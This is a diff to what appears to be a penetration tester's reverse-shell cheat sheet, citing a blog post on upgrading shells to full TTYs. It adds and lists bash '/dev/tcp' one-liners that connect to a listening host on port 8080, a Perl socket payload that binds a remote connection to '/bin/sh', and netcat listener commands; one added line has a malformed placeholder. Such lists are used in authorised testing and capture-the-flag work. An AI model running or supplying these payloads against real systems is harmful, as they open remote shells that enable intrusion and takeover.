@@ -20,7 +20,8 @@ https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 	xterm
 
 # Bash
-- bash -i >& /dev/tcp/10.93.3.19/8080 0>&1
+- bash -i >& /dev/tcp/[IP]]/[Por] 0>&1
+- bash -c 'bash -i >& /dev/tcp/10.93.3.19/8080 0>&1'
 
 # Perl
 - perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -55,3 +56,4 @@ https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
  ## Basic Server Listener ##
  nc -l [port]
  nc -lvp [port]
+ nc -lvnp [port]
